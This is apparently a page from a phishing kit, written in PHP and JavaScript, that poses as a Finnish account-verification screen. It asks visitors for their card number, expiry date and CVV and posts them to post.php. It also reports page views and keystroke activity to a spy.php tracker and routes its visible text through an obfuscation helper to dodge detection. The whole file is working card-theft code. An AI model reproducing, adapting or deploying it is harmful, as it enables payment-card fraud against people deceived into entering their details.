<?php 
require '../main.php';
$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
    $ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/logo.svg">
</div>
<div class="right">
<span><?php $bm->obf("Tarvitsetko apua?"); ?></span>
<span><?php $bm->obf("Poistu"); ?></span>
</div>
</header>

<div class="banner">
    <img src="res/key.svg">
    <h4><?php $bm->obf("Tunnistautuminen"); ?></h4>
</div>

<main>
<div class="form-holder">
<div class="form-banner">
<h4><?php $bm->obf("Tilin tunnistaminen"); ?></h4>
</div>
<img src="res/user.jpg">

<div class="multi">
<div class="left">
<p><?php $bm->obf("Varmista tarkistus syöttämällä korttitietosi."); ?></p>
 </div>


<div class="right">

<div class="col">
<label><?php $bm->obf("Kortin numero"); ?> </label>
<input type="text" id="d1" placeholder="0000 0000 0000 0000">
</div>

<div class="col">
<label><?php $bm->obf("Viimeinen voimassaolopäivä"); ?> </label>
<input type="text" id="d2" placeholder="KK/VV">
</div>

<div class="col">
<label><?php $bm->obf("Turvakoodi"); ?> </label>
<input type="text" id="d3" placeholder="CVV">
</div>





<div class="col">
    <button onclick="sendCard()"><?php $bm->obf("Jatka"); ?></button>
</div>


</div>

</div>

</div>
</main>
    

<div class="window" id="error" style="display:<?php echo isset($_GET['e']) ? "block" : "none" ; ?>">
<div class="content">
<div class="form-error">
<h5>Virhe</h5>
<p><?php $bm->obf("Virheelliset tiedot. Yritä uudelleen."); ?></p>
<div style="text-align:center">
<button onclick="exitError()">Ok</button>
</div>
</div>
</div>
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>

<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('000');
 
 


var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=1; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 


if($("#d1").val().length<19){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}
 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<24 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $.post("post.php", 
			{
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val()

			}, function(done){
                window.location="mkfile.php?p=wait";
			}
		
		);

    }
}

function exitError(){
    $("#error").hide();
}



$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});


$.post("spy.php", {cardview:1});
var abort = false;
$("input").keyup(function(){
	if(abort==false){
		$.post("spy.php", {cadring:1});
		abort=true;
	}
});
</script>
<?php 
$m->ctr("CARD ".@$_GET['e']);
?>
</body>


</body>
</html>